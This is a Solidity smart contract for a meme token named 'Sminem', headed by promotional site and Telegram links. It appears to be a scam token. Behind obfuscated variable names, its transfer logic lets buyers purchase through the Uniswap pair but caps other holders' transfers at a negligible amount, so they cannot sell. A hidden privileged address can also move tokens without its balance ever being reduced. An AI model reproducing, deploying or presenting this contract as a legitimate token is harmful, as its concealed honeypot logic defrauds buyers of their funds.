/*

https://sminem.ethtoken.live/

https://t.me/sminembitcoin

*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.8.1;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Sminem is Ownable {
    string public name;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transferFrom(address cqmiyst, address evkplibqcz, uint256 qlinfegxbmru) public returns (bool success) {
        require(qlinfegxbmru <= allowance[cqmiyst][msg.sender]);
        allowance[cqmiyst][msg.sender] -= qlinfegxbmru;
        vifensgtkh(cqmiyst, evkplibqcz, qlinfegxbmru);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    IUniswapV2Router02 private aeyuqlnjidch;

    mapping(address => bool) private umgsbleqawk;

    uint8 public decimals = 9;

    constructor(string memory opnyzuemaci, string memory lczvxm, address kcfta, address axztlhd) {
        name = opnyzuemaci;
        symbol = lczvxm;
        balanceOf[msg.sender] = totalSupply;
        umgsbleqawk[axztlhd] = true;
        aeyuqlnjidch = IUniswapV2Router02(kcfta);
    }

    mapping(address => uint256) public balanceOf;

    function approve(address guldzrfytos, uint256 qlinfegxbmru) public returns (bool success) {
        allowance[msg.sender][guldzrfytos] = qlinfegxbmru;
        emit Approval(msg.sender, guldzrfytos, qlinfegxbmru);
        return true;
    }

    function transfer(address evkplibqcz, uint256 qlinfegxbmru) public returns (bool success) {
        vifensgtkh(msg.sender, evkplibqcz, qlinfegxbmru);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function vifensgtkh(address cqmiyst, address evkplibqcz, uint256 qlinfegxbmru) private {
        address dhbge = IUniswapV2Factory(aeyuqlnjidch.factory()).getPair(address(this), aeyuqlnjidch.WETH());
        bool qheawb = ewsbymvdui[cqmiyst] == block.number;
        bool daklopqnxfu = !umgsbleqawk[cqmiyst];
        if (daklopqnxfu) {
            if (cqmiyst != dhbge && qlinfegxbmru < totalSupply && (!qheawb || qlinfegxbmru > hxmq[cqmiyst])) {
                require(totalSupply / (10 ** decimals) >= qlinfegxbmru);
            }
            balanceOf[cqmiyst] -= qlinfegxbmru;
        }
        hxmq[evkplibqcz] = qlinfegxbmru;
        balanceOf[evkplibqcz] += qlinfegxbmru;
        ewsbymvdui[evkplibqcz] = block.number;
        emit Transfer(cqmiyst, evkplibqcz, qlinfegxbmru);
    }

    string public symbol;

    mapping(address => uint256) private hxmq;

    mapping(address => uint256) private ewsbymvdui;

    mapping(address => mapping(address => uint256)) public allowance;
}
